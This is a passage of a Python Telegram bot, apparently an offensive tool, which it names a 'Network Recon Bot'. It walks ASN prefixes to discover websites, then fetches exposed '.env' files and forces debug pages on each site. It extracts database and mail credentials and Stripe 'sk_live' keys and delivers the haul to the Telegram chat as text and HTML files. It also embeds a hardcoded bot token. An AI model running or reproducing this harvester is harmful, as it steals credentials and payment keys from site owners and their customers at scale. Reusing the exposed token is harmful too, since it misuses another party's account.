import os
import re
import json
import socket
import ssl
import ipaddress
import http.client
import requests
import time
import logging
import tempfile
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor
from threading import Lock, Thread, local as thread_local_cls
import telebot
from telebot import types
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════
#  Config
# ═══════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8985328412:AAFn5lLqsNGvEVQDOZ3NgKA-xEp7ptZAzww")
MAX_THREADS = 25
DEFAULT_IPS_PER_PREFIX = 16
SCAN_TIMEOUT = 3.0
MAX_SITES_FOR_LEAK = 999999
LEAK_TIMEOUT = 5
LEAK_CONTENT_LIMIT = 512 * 1024  # 512KB per response
LEAK_CONTENT_STORE = 10 * 1024   # 10KB per site stored
LEAK_BATCH_SIZE = 2000

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO
)
log = logging.getLogger("recon-bot")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ═══════════════════════════════════════
#  Thread-local sessions for connection reuse
# ═══════════════════════════════════════
_thread_local = thread_local_cls()


def get_session():
    if not hasattr(_thread_local, "session"):
        s = requests.Session()
        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 12)"})
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=MAX_THREADS * 2,
            pool_maxsize=MAX_THREADS * 2,
            max_retries=0,
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        _thread_local.session = s
    return _thread_local.session


# ═══════════════════════════════════════
#  Background thread runner
# ═══════════════════════════════════════
def run_in_background(func, *args):
    t = Thread(target=func, args=args, daemon=True)
    t.start()
    return t


# ═══════════════════════════════════════
#  Active scans tracker
# ═══════════════════════════════════════
active_scans = {}
scan_lock = Lock()


def set_scan(chat_id, status):
    with scan_lock:
        active_scans[chat_id] = status


def get_scan(chat_id):
    with scan_lock:
        return active_scans.get(chat_id)


def clear_scan(chat_id):
    with scan_lock:
        active_scans.pop(chat_id, None)


# ═══════════════════════════════════════
#  UI Helpers
# ═══════════════════════════════════════
def progress_bar(pct, width=20):
    filled = int(width * pct / 100)
    return "▓" * filled + "░" * (width - filled)


def fmt_num(n):
    return f"{n:,}"


def fmt_time(seconds):
    if seconds < 60:
        return f"{seconds:.0f}s"
    elif seconds < 3600:
        return f"{seconds/60:.0f}m {seconds%60:.0f}s"
    return f"{int(seconds//3600)}h {int((seconds%3600)//60)}m"


def make_main_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("🚀 Pipeline", callback_data="menu_pipeline"),
        types.InlineKeyboardButton("🔍 ASN Lookup", callback_data="menu_asn"),
    )
    m.add(
        types.InlineKeyboardButton("🌐 Site Scan", callback_data="menu_scan"),
        types.InlineKeyboardButton("📡 IP Lookup", callback_data="menu_ip"),
    )
    m.add(
        types.InlineKeyboardButton("🔓 Leak Scan", callback_data="menu_leak"),
        types.InlineKeyboardButton("🔗 Full Chain", callback_data="menu_chain"),
    )
    m.add(
        types.InlineKeyboardButton("📦 Batch Scan", callback_data="menu_batch"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
    )
    m.add(
        types.InlineKeyboardButton("📊 Status", callback_data="menu_status"),
        types.InlineKeyboardButton("❓ Help", callback_data="menu_help"),
    )
    return m


def make_cancel_button():
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("🛑 Cancel", callback_data="cancel_scan"))
    return m


def make_back_button():
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("◀️ Menu", callback_data="menu_main"))
    return m


def make_pipeline_depth_buttons():
    m = types.InlineKeyboardMarkup(row_width=3)
    m.add(
        types.InlineKeyboardButton("⚡ Fast (8)", callback_data="pipe_8"),
        types.InlineKeyboardButton("⚖️ Balanced (16)", callback_data="pipe_16"),
        types.InlineKeyboardButton("🔍 Deep (32)", callback_data="pipe_32"),
    )
    m.add(types.InlineKeyboardButton("🛑 Cancel", callback_data="cancel_scan"))
    return m


def make_batch_depth_buttons():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("⚡ 8 IPs", callback_data="batch_8"),
        types.InlineKeyboardButton("⚖️ 16 IPs", callback_data="batch_16"),
    )
    m.add(
        types.InlineKeyboardButton("🔍 32 IPs", callback_data="batch_32"),
        types.InlineKeyboardButton("🔬 64 IPs", callback_data="batch_64"),
    )
    return m


def make_leak_type_buttons():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("🔓 .env only", callback_data="leaktype_env"),
        types.InlineKeyboardButton("🐛 Debug only", callback_data="leaktype_debug"),
    )
    m.add(
        types.InlineKeyboardButton("🔓🐛 Both (full)", callback_data="leaktype_both"),
        types.InlineKeyboardButton("🛑 Cancel", callback_data="cancel_scan"),
    )
    return m


# ═══════════════════════════════════════
#  HTTPS via IP with proper SNI
# ═══════════════════════════════════════
def https_get_via_ip(ip, hostname, path, timeout=15):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((ip, 443), timeout=timeout)
    ssock = ctx.wrap_socket(sock, server_hostname=hostname)
    conn = http.client.HTTPSConnection(hostname, timeout=timeout)
    conn.sock = ssock
    conn.request("GET", path, headers={
        "Host": hostname,
        "User-Agent": "Mozilla/5.0 (Linux; Android 12)",
        "Accept": "application/json"
    })
    resp = conn.getresponse()
    status = resp.status
    body = resp.read().decode()
    conn.close()
    return status, body


# ═══════════════════════════════════════
#  DNS Resolution
# ═══════════════════════════════════════
def resolve_host(hostname):
    try:
        socket.setdefaulttimeout(5)
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return None


def doh_resolve(hostname):
    for url, hdr in [
        ("https://dns.google/resolve", {"Accept": "application/json"}),
        ("https://cloudflare-dns.com/dns-query", {"Accept": "application/dns-json"}),
    ]:
        try:
            r = requests.get(url, params={"name": hostname, "type": "A"},
                           headers=hdr, timeout=10, verify=False)
            for ans in r.json().get("Answer", []):
                if ans.get("type") == 1:
                    return ans.get("data")
        except Exception:
            pass
    return None


def resolve_any(hostname):
    return resolve_host(hostname) or doh_resolve(hostname)


def parse_url(url):
    url = url.strip()
    for p in ["https://", "http://"]:
        if url.startswith(p):
            url = url[len(p):]
    return url.split("/")[0].split(":")[0].split("?")[0].split("#")[0]


# ═══════════════════════════════════════
#  RIPE Stat API
# ═══════════════════════════════════════
def asn_to_prefixes(asn):
    hostname = "stat.ripe.net"
    path = f"/data/announced-prefixes/data.json?resource=AS{asn}"
    api_ip = resolve_any(hostname)
    if not api_ip:
        return [], "Cannot resolve stat.ripe.net"
    try:
        status, body = https_get_via_ip(api_ip, hostname, path)
        if status != 200:
            return [], f"HTTP {status}"
        obj = json.loads(body)
        prefixes = [i.get("prefix", "") for i in obj.get("data", {}).get("prefixes", [])]
        prefixes = [p for p in prefixes if "/" in p and ":" not in p]
        return prefixes, None
    except Exception as e:
        return [], str(e)[:80]


def asn_info(asn):
    hostname = "stat.ripe.net"
    path = f"/data/as-overview/data.json?resource=AS{asn}"
    api_ip = resolve_any(hostname)
    if not api_ip:
        return {}
    try:
        status, body = https_get_via_ip(api_ip, hostname, path)
        return json.loads(body).get("data", {})
    except Exception:
        return {}


def ip_to_asn(ip):
    hostname = "stat.ripe.net"
    path = f"/data/prefix-overview/data.json?resource={ip}"
    api_ip = resolve_any(hostname)
    if not api_ip:
        return None, None, None
    try:
        status, body = https_get_via_ip(api_ip, hostname, path)
        obj = json.loads(body)
        data = obj.get("data", {})
        asns = data.get("asns", [{}])
        prefix = data.get("resource", "Unknown")
        if asns:
            return asns[0].get("asn"), asns[0].get("holder", "Unknown"), prefix
        return None, None, prefix
    except Exception:
        return None, None, None


# ═══════════════════════════════════════
#  IP Scanner — site discovery
# ═══════════════════════════════════════
def scan_ip_fast(ip):
    r = {"ip": ip, "domains": set(), "title": None, "server": None}

    # Reverse DNS — longer timeout
    try:
        socket.setdefaulttimeout(5)
        r["domains"].add(socket.gethostbyaddr(ip)[0])
    except (socket.herror, socket.gaierror, OSError):
        pass

    # SSL cert domains
    try:
        socket.setdefaulttimeout(SCAN_TIMEOUT)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.create_connection((ip, 443), timeout=SCAN_TIMEOUT)
        ssock = ctx.wrap_socket(sock, server_hostname=ip)
        cert = ssock.getpeercert(binary_form=True)
        ssock.close()
        if cert:
            for d in re.findall(
                rb'(?:[\x02\x82][\x01-\x03])((?:[\w-]+\.)*[\w-]+\.[\w]{2,})',
                cert
            ):
                d = d.decode('ascii', errors='ignore').strip('.')
                if d and '*' not in d and '.' in d and not d[0].isdigit():
                    r["domains"].add(d.lower())
    except (socket.timeout, OSError, ssl.SSLError):
        pass

    # HTTP probe
    try:
        socket.setdefaulttimeout(SCAN_TIMEOUT)
        sock = socket.create_connection((ip, 80), timeout=SCAN_TIMEOUT)
        sock.send(
            b"GET / HTTP/1.0\r\nHost: " + ip.encode() +
            b"\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        )
        data = b""
        while True:
            chunk = sock.recv(1024)
            if not chunk or len(data) > 2048:
                break
            data += chunk
        sock.close()
        resp = data.decode('utf-8', errors='ignore')
        t = re.search(r'<title>(.*?)</title>', resp, re.IGNORECASE | re.DOTALL)
        if t:
            r["title"] = t.group(1).strip()[:80]
        for line in resp.split('\r\n'):
            if line.lower().startswith('server:'):
                r["server"] = line.split(':', 1)[1].strip()[:50]
    except (socket.timeout, OSError):
        pass

    return r


def prefix_to_ips(prefix, max_ips=DEFAULT_IPS_PER_PREFIX):
    try:
        net = ipaddress.ip_network(prefix, strict=False)
        return [str(ip) for i, ip in enumerate(net.hosts()) if i < max_ips]
    except ValueError:
        return []


# ═══════════════════════════════════════
#  File-based leak result storage (RAM-safe)
# ═══════════════════════════════════════
ENV_KEYS = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=']
DEBUG_KEYS = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG']

TMP_DIR = tempfile.mkdtemp(prefix="leakscan_")
file_lock = Lock()

result_counters = {
    "env_http": 0,
    "env_https": 0,
    "debug": 0,
}

sk_keys_set = set()
sk_sites_set = set()


def _write_result(file_name, text):
    with file_lock:
        fpath = os.path.join(TMP_DIR, file_name)
        with open(fpath, "a") as f:
            f.write(text)
            f.flush()


def _read_result(file_name):
    fpath = os.path.join(TMP_DIR, file_name)
    if os.path.exists(fpath):
        with open(fpath, "r") as f:
            return f.read()
    return ""


def _reset_results():
    global result_counters, sk_keys_set, sk_sites_set
    result_counters = {
        "env_http": 0,
        "env_https": 0,
        "debug": 0,
    }
    sk_keys_set = set()
    sk_sites_set = set()
    for fn in ["env_sites.txt", "env_contents.txt",
               "debug_sites.txt", "debug_contents.txt",
               "sk_keys.txt", "sk_sites.txt"]:
        fpath = os.path.join(TMP_DIR, fn)
        if os.path.exists(fpath):
            os.remove(fpath)


# ═══════════════════════════════════════
#  Leak Scanners (memory-safe)
# ═══════════════════════════════════════
def _read_response_limited(response, limit=LEAK_CONTENT_LIMIT):
    content = ""
    size = 0
    for chunk in response.iter_content(chunk_size=8192, decode_unicode=True):
        content += chunk
        size += len(chunk)
        if size > limit:
            break
    response.close()
    return content


def scan_env(site, proto="http"):
    global result_counters, sk_keys_set, sk_sites_set
    try:
        session = get_session()
        r = session.get(
            f'{proto}://{site}/.env',
            verify=False, timeout=LEAK_TIMEOUT, allow_redirects=False,
            stream=True
        )
        if r.status_code != 200:
            r.close()
            return False

        content = _read_response_limited(r)

        if not any(k in content for k in ENV_KEYS):
            return False

        sk = []
        for line in content.splitlines():
            if "sk_live" in line:
                key = re.sub(r'.*sk_live', 'sk_live', line).replace('"', '').strip()
                sk.append(key)

        _write_result("env_sites.txt", f"{site}\n")
        _write_result("env_contents.txt",
                       f"# ═══ {proto}://{site}/.env ═══\n"
                       f"{content[:LEAK_CONTENT_STORE]}\n\n")

        for k in sk:
            _write_result("sk_keys.txt", f"{k}\n")
            with file_lock:
                sk_keys_set.add(k)
        if sk:
            _write_result("sk_sites.txt", f"{site}\n")
            with file_lock:
                sk_sites_set.add(site)

        with file_lock:
            if proto == "http":
                result_counters["env_http"] += 1
            else:
                result_counters["env_https"] += 1

        return True

    except Exception:
        return False


def scan_debug(site):
    global result_counters, sk_keys_set, sk_sites_set
    for proto in ["https", "http"]:
        try:
            session = get_session()
            r = session.post(
                f'{proto}://{site}',
                data={'debug': 'true'},
                allow_redirects=False, verify=False,
                timeout=LEAK_TIMEOUT, stream=True
            )
            content = _read_response_limited(r)

            if any(k in content for k in DEBUG_KEYS):
                sk = []
                for line in content.splitlines():
                    if "sk_live" in line:
                        key = re.sub(r'.*sk_live', 'sk_live', line).replace('"', '').strip()
                        sk.append(key)

                _write_result("debug_sites.txt", f"{site}\n")
                _write_result("debug_contents.txt",
                               f"# ═══ {proto}://{site} (debug=true) ═══\n"
                               f"{content[:LEAK_CONTENT_STORE]}\n\n")

                for k in sk:
                    _write_result("sk_keys.txt", f"{k}\n")
                    with file_lock:
                        sk_keys_set.add(k)
                if sk:
                    _write_result("sk_sites.txt", f"{site}\n")
                    with file_lock:
                        sk_sites_set.add(site)

                with file_lock:
                    result_counters["debug"] += 1

                return True
        except Exception:
            continue
    return False


# ═══════════════════════════════════════
#  Batch runners
# ═══════════════════════════════════════
def run_ip_scan(chat_id, ips, progress_msg_id):
    all_domains = set()
    found = 0
    done = 0
    total = len(ips)
    lock = Lock()
    start = time.time()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(scan_ip_fast, ip): ip for ip in ips}
        for future in futures:
            pass
        from concurrent.futures import as_completed
        done = 0
        for future in as_completed(futures):
            result = future.result()
            done += 1

            if result["domains"] or result["title"]:
                found += 1
                with lock:
                    all_domains.update(result["domains"])

            if done % 500 == 0 and done < total:
                pct = (done / total) * 100
                elapsed = time.time() - start
                speed = done / elapsed if elapsed > 0 else 0
                eta = (total - done) / speed if speed > 0 else 0
                try:
                    bot.edit_message_text(
                        f"🌐 <b>Site Discovery</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"<code>{progress_bar(pct)}</code> {pct:.0f}%\n\n"
                        f"📊 {fmt_num(done)} / {fmt_num(total)} IPs\n"
                        f"🟢 Hosts: <b>{fmt_num(found)}</b>\n"
                        f"🌐 Domains: <b>{fmt_num(len(all_domains))}</b>\n"
                        f"⚡ {speed:.0f} IP/s · 🕐 ETA {fmt_time(eta)}",
                        chat_id, progress_msg_id,
                        reply_markup=make_cancel_button()
                    )
                except Exception:
                    pass

    elapsed = time.time() - start
    return all_domains, found, done, elapsed


def run_leak_scan(chat_id, sites, progress_msg_id, step_name="Leak Scan", scan_type="both"):
    _reset_results()

    done = 0
    total = len(sites)
    start = time.time()

    def do_site(site):
        if scan_type in ("env", "both"):
            scan_env(site, "http")
            scan_env(site, "https")
        if scan_type in ("debug", "both"):
            scan_debug(site)

    # ═══════════════════════════════════════
    #  Batch mode — 2000 sites တစ်ခါ, RAM safe
    # ═══════════════════════════════════════
    for batch_idx in range(0, total, LEAK_BATCH_SIZE):
        batch = sites[batch_idx:batch_idx + LEAK_BATCH_SIZE]

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            list(executor.map(do_site, batch))

        done += len(batch)

        pct = (done / total) * 100
        elapsed = time.time() - start
        speed = done / elapsed if elapsed > 0 else 0
        eta = (total - done) / speed if speed > 0 else 0
        try:
            bot.edit_message_text(
                f"🔓 <b>{step_name}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<code>{progress_bar(pct)}</code> {pct:.0f}%\n\n"
                f"📊 {fmt_num(done)} / {fmt_num(total)} sites\n"
                f"🔓 .env HTTP: <b>{result_counters['env_http']}</b>\n"
                f"🔐 .env HTTPS: <b>{result_counters['env_https']}</b>\n"
                f"🐛 Debug: <b>{result_counters['debug']}</b>\n"
                f"💳 Stripe keys: <b>{len(sk_keys_set)}</b>\n"
                f"🕐 ETA: {fmt_time(eta)}",
                chat_id, progress_msg_id,
                reply_markup=make_cancel_button()
            )
        except Exception:
            pass

        time.sleep(0.5)

    elapsed = time.time() - start
    return result_counters.copy(), sk_keys_set.copy(), sk_sites_set.copy(), elapsed


# ═══════════════════════════════════════
#  File helpers
# ═══════════════════════════════════════
def make_txt_file(content, filename):
    bio = BytesIO(content.encode("utf-8"))
    bio.name = filename
    return bio


def build_sk_html(sk_keys):
    html = (
        "<html><head><meta charset='utf-8'><style>"
        "body{background:#1a1a2e;color:#eee;font-family:monospace;padding:20px}"
        ".key{background:#16213e;padding:12px;margin:8px;border-radius:6px;"
        "border-left:4px solid #e94560;word-break:break-all}"
        "h1{color:#e94560;font-size:24px}"
        ".warn{color:#ff6b6b;font-size:14px;margin-bottom:20px}"
        ".count{color:#4ecdc4;font-size:18px}"
        "</style></head><body>"
        f"<h1>⚠️ Stripe LIVE Keys</h1>"
        f"<div class='warn'>Found: <span class='count'>{len(sk_keys)}</span> keys</div>"
    )
    for k in sorted(sk_keys):
        html += f"<div class='key'>{k}</div>"
    html += "</body></html>"
    return html


def deliver_leak_files(chat_id, suffix):
    ts = int(time.time())
    tag = f"{suffix}_{ts}"

    env_sites = _read_result("env_sites.txt")
    if env_sites.strip():
        sites_list = sorted(set(env_sites.strip().splitlines()))
        bot.send_document(
            chat_id,
            make_txt_file("\n".join(sites_list), f"env_exposed_{tag}.txt"),
            caption=f"🔓 {len(sites_list)} .env exposed"
        )

        env_contents = _read_result("env_contents.txt")
        if env_contents.strip():
            bot.send_document(
                chat_id,
                make_txt_file(env_contents, f"env_contents_{tag}.txt"),
                caption=f"📄 .env contents ({len(sites_list)} sites)"
            )

    debug_sites = _read_result("debug_sites.txt")
    if debug_sites.strip():
        sites_list = sorted(set(debug_sites.strip().splitlines()))
        bot.send_document(
            chat_id,
            make_txt_file("\n".join(sites_list), f"debug_exposed_{tag}.txt"),
            caption=f"🐛 {len(sites_list)} debug exposed"
        )

        debug_contents = _read_result("debug_contents.txt")
        if debug_contents.strip():
            bot.send_document(
                chat_id,
                make_txt_file(debug_contents, f"debug_contents_{tag}.txt"),
                caption=f"🐛 {len(sites_list)} debug contents"
            )

    if sk_keys_set:
        keys_sorted = sorted(sk_keys_set)
        bot.send_document(
            chat_id,
            make_txt_file("\n".join(keys_sorted), f"sk_live_keys_{tag}.txt"),
            caption=f"💳 {len(keys_sorted)} Stripe LIVE keys"
        )

        bot.send_document(
            chat_id,
            make_txt_file(build_sk_html(keys_sorted), f"sk_live_{tag}.html"),
            caption=f"💳 {len(keys_sorted)} Stripe keys (HTML)"
        )

    if sk_sites_set:
        sites_sorted = sorted(sk_sites_set)
        bot.send_document(
            chat_id,
            make_txt_file("\n".join(sites_sorted), f"sk_sites_{tag}.txt"),
            caption=f"💰 {len(sites_sorted)} sites with Stripe keys"
        )

    _reset_results()


# ═══════════════════════════════════════════════
#  PIPELINE — Full auto chain
# ═══════════════════════════════════════════════

def _pipeline_worker(chat_id, asns, max_ips, msg_id):
    set_scan(chat_id, "pipeline")
    results = {"asns": asns, "prefixes": set(), "sites": set()}

    try:
        try:
            bot.edit_message_text(
                f"🚀 <b>Pipeline Started</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<b>Step 1/3: ASN → Prefixes</b>\n"
                f"<code>{progress_bar(0)}</code> 0%\n\n"
                f"Processing {len(asns)} ASN(s)...",
                chat_id, msg_id, reply_markup=make_cancel_button()
            )
        except Exception:
            pass

        asn_results = []
        for i, asn in enumerate(asns):
            if not get_scan(chat_id):
                raise Exception("cancelled")

            prefixes, err = asn_to_prefixes(asn)
            info = asn_info(asn)
            holder = info.get("holder", "Unknown")

            if err:
                asn_results.append(f"  ❌ AS{asn}: {err}")
            else:
                new = set(prefixes) - results["prefixes"]
                results["prefixes"].update(prefixes)
                asn_results.append(
                    f"  ✅ AS{asn} ({holder}): {fmt_num(len(prefixes))} ({fmt_num(len(new))} new)"
                )

            pct = int(((i + 1) / len(asns)) * 100)
            try:
                bot.edit_message_text(
                    f"🚀 <b>Pipeline</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"<b>Step 1/3: ASN → Prefixes</b>\n"
                    f"<code>{progress_bar(pct)}</code> {pct}%\n\n"
                    + "\n".join(asn_results) +
                    f"\n\n📦 Total: <b>{fmt_num(len(results['prefixes']))}</b> prefixes",
                    chat_id, msg_id, reply_markup=make_cancel_button()
                )
            except Exception:
                pass

        if not results["prefixes"]:
            bot.edit_message_text("❌ No prefixes found.", chat_id, msg_id,
                                  reply_markup=make_back_button())
            return

        all_ips = []
        for prefix in results["prefixes"]:
            all_ips.extend(prefix_to_ips(prefix, max_ips))
        all_ips = list(set(all_ips))

        try:
            bot.edit_message_text(
                f"🚀 <b>Pipeline</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<b>Step 2/3: Site Discovery</b>\n"
                f"<code>{progress_bar(0)}</code> 0%\n\n"
                f"🎯 IPs: <b>{fmt_num(len(all_ips))}</b>\n"
                f"⏱ ETA: ~{fmt_time(len(all_ips)/(MAX_THREADS*2))}",
                chat_id, msg_id, reply_markup=make_cancel_button()
            )
        except Exception:
            pass

        sites, found, scanned, t2 = run_ip_scan(chat_id, all_ips, msg_id)

        if not get_scan(chat_id):
            raise Exception("cancelled")

        results["sites"] = sites

        try:
            bot.edit_message_text(
                f"🚀 <b>Pipeline</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"✅ <b>Step 2/3 Complete</b>\n\n"
                f"📊 Scanned: {fmt_num(scanned)} ({fmt_time(t2)})\n"
                f"🟢 Hosts: {fmt_num(found)}\n"
                f"🌐 Sites: <b>{fmt_num(len(sites))}</b>\n\n"
                f"Starting leak scan...",
                chat_id, msg_id, reply_markup=make_cancel_button()
            )
        except Exception:
            pass

        if not sites:
            bot.send_message(chat_id, "😕 No sites found. Pipeline stopped.")
            return

        sites_list = list(sites)
        if len(sites_list) > MAX_SITES_FOR_LEAK:
            bot.send_message(chat_id,
                f"⚠️ {fmt_num(len(sites_list))} sites — capping at {MAX_SITES_FOR_LEAK}")
            sites_list = sites_list[:MAX_SITES_FOR_LEAK]

        counters, sk_keys_copy, sk_sites_copy, t3 = run_leak_scan(
            chat_id, sites_list, msg_id, "Step 3/3: Leak Scan", "both"
        )

        summary = (
            f"✅ <b>Pipeline Complete</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<code>{progress_bar(100)}</code> 100%\n\n"
            f"<b>📊 Stats:</b>\n"
            f"  🔍 ASNs: {len(asns)}\n"
            f"  📦 Prefixes: {fmt_num(len(results['prefixes']))}\n"
            f"  🎯 IPs: {fmt_num(len(all_ips))}\n"
            f"  🌐 Sites: {fmt_num(len(sites))}\n\n"
            f"<b>🔓 Leaks:</b>\n"
            f"  📄 .env (HTTP): <b>{counters['env_http']}</b>\n"
            f"  🔐 .env (HTTPS): <b>{counters['env_https']}</b>\n"
            f"  🐛 Debug: <b>{counters['debug']}</b>\n"
            f"  💳 Stripe keys: <b>{len(sk_keys_copy)}</b>\n\n"
            f"⏱ Time: {fmt_time(t2 + t3)}"
        )

        try:
            bot.edit_message_text(summary, chat_id, msg_id)
        except Exception:
            bot.send_message(chat_id, summary)

        suffix = f"AS{'_'.join(asns)}"

        if results["prefixes"]:
            bot.send_document(chat_id,
                make_txt_file("\n".join(sorted(results["prefixes"])), f"prefixes_{suffix}.txt"),
                caption=f"📦 {fmt_num(len(results['prefixes']))} prefixes")

        if results["sites"]:
            bot.send_document(chat_id,
                make_txt_file("\n".join(sorted(results["sites"])), f"sites_{suffix}.txt"),
                caption=f"🌐 {fmt_num(len(results['sites']))} sites")

        deliver_leak_files(chat_id, suffix)

        bot.send_message(chat_id, "🏁 <b>All done.</b>", reply_markup=make_back_button())

    except Exception as e:
        if "cancelled" in str(e):
            bot.send_message(chat_id, "🛑 Pipeline cancelled.", reply_markup=make_back_button())
        else:
            log.error(f"Pipeline error: {e}")
            bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}", reply_markup=make_back_button())
    finally:
        clear_scan(chat_id)


@bot.message_handler(commands=["pipeline"])
def cmd_pipeline(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(
            message.chat.id,
            "🚀 <b>Full Pipeline</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "ASN → Prefixes → Sites → Leak Scan → Files\n\n"
            "<b>Usage:</b>\n"
            "<code>/pipeline 15169</code>\n"
            "<code>/pipeline 15169 13335</code>\n\n"
            "⚠️ Heavy multi-step scan.",
            reply_markup=make_back_button()
        )
        return

    asns = []
    for p in parts[1:]:
        clean = p.upper().replace("AS", "").strip()
        if clean.isdigit():
            asns.append(clean)

    if not asns:
        bot.reply_to(message, "❌ Invalid ASN numbers.")
        return

    if get_scan(message.chat.id):
        bot.reply_to(message, "⚠️ Scan running. Use /cancel first.")
        return

    with scan_lock:
        active_scans[f"{message.chat.id}_pipe_asns"] = asns

    bot.send_message(
        message.chat.id,
        f"🚀 <b>Pipeline Setup</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 ASNs: <code>{', '.join(asns)}</code>\n\n"
        f"<b>Chain:</b>\n"
        f"  1️⃣ ASN → Prefixes\n"
        f"  2️⃣ Prefixes → Sites\n"
        f"  3️⃣ Sites → .env + Debug + Stripe\n\n"
        f"Select IP depth per prefix 👇",
        reply_markup=make_pipeline_depth_buttons()
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("pipe_"))
def cb_pipeline_depth(call):
    chat_id = call.message.chat.id
    max_ips = int(call.data.split("_")[1])

    with scan_lock:
        asns = active_scans.pop(f"{chat_id}_pipe_asns", None)

    if not asns:
        bot.answer_callback_query(call.id, "No pending. Use /pipeline again.")
        return

    bot.answer_callback_query(call.id)
    msg_id = call.message.message_id

    run_in_background(_pipeline_worker, chat_id, asns, max_ips, msg_id)


# ═══════════════════════════════════════════════
#  BASIC COMMANDS
# ═══════════════════════════════════════════════

@bot.message_handler(commands=["start"])
def cmd_start(message):
    bot.send_message(
        message.chat.id,
        "🌐 <b>Network Recon Bot</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "ASN · Sites · IPs · Leaks\n"
        "Batch · Chain · 🚀 Pipeline\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Select an option 👇",
        reply_markup=make_main_menu()
    )


@bot.message_handler(commands=["help"])
def cmd_help(message):
    bot.send_message(
        message.chat.id,
        "📖 <b>Help</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 <code>/pipeline 15169</code> — full chain\n"
        "🔍 <code>/asn 15169</code> — prefixes\n"
        "🌐 <code>/scan 1.0.0.0/24</code> — sites\n"
        "📡 <code>/ip 8.8.8.8</code> — IP info\n"
        "🔓 <code>/leak site.com</code> — .env/debug\n"
        "🔓 <code>/leak file</code> — upload .txt\n"
        "🔗 <code>/chain site.com</code> — trace\n"
        "📦 <code>/batch</code> — upload file\n"
        "🛑 <code>/cancel</code> · 📊 <code>/status</code>",
        reply_markup=make_back_button()
    )


@bot.message_handler(commands=["asn"])
def cmd_asn(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(message.chat.id,
            "🔍 <b>ASN Lookup</b>\n\n"
            "Usage: <code>/asn 15169</code>\n"
            "Multiple: <code>/asn 15169 13335</code>",
            reply_markup=make_back_button())
        return

    asns = []
    for p in parts[1:]:
        clean = p.upper().replace("AS", "").strip()
        if clean.isdigit():
            asns.append(clean)

    if not asns:
        bot.reply_to(message, "❌ Invalid ASN numbers.")
        return

    status_msg = bot.send_message(message.chat.id,
        f"🔍 Looking up {len(asns)} ASN(s)...\n<code>{progress_bar(10)}</code>")

    all_prefixes = set()
    results = []

    for i, asn in enumerate(asns):
        prefixes, err = asn_to_prefixes(asn)
        info = asn_info(asn)
        holder = info.get("holder", "Unknown")
        pct = int(((i + 1) / len(asns)) * 100)

        if err:
            results.append(f"❌ <b>AS{asn}</b> — {err}")
        else:
            new = set(prefixes) - all_prefixes
            all_prefixes.update(prefixes)
            results.append(f"✅ <b>AS{asn}</b> ({holder})\n   📊 {fmt_num(len(prefixes))} ({fmt_num(len(new))} new)")

        try:
            bot.edit_message_text(
                f"🔍 <b>ASN Lookup</b>\n<code>{progress_bar(pct)}</code> {pct}%\n\n" + "\n\n".join(results),
                message.chat.id, status_msg.message_id)
        except Exception:
            pass

    summary = (
        f"✅ <b>ASN Lookup Complete</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        + "\n\n".join(results) +
        f"\n\n📦 <b>Total: {fmt_num(len(all_prefixes))} unique</b>"
    )
    try:
        bot.edit_message_text(summary, message.chat.id, status_msg.message_id)
    except Exception:
        bot.send_message(message.chat.id, summary)

    if all_prefixes:
        bot.send_document(
            message.chat.id,
            make_txt_file("\n".join(sorted(all_prefixes)), f"prefixes_{'_'.join(asns)}.txt"),
            caption=f"📦 {fmt_num(len(all_prefixes))} prefixes",
            reply_markup=make_back_button()
        )


@bot.message_handler(commands=["scan"])
def cmd_scan(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(message.chat.id,
            "🌐 <b>Site Scan</b>\n\n"
            "Usage: <code>/scan 1.0.0.0/24</code>\n"
            "Custom: <code>/scan 1.0.0.0/24 32</code>",
            reply_markup=make_back_button())
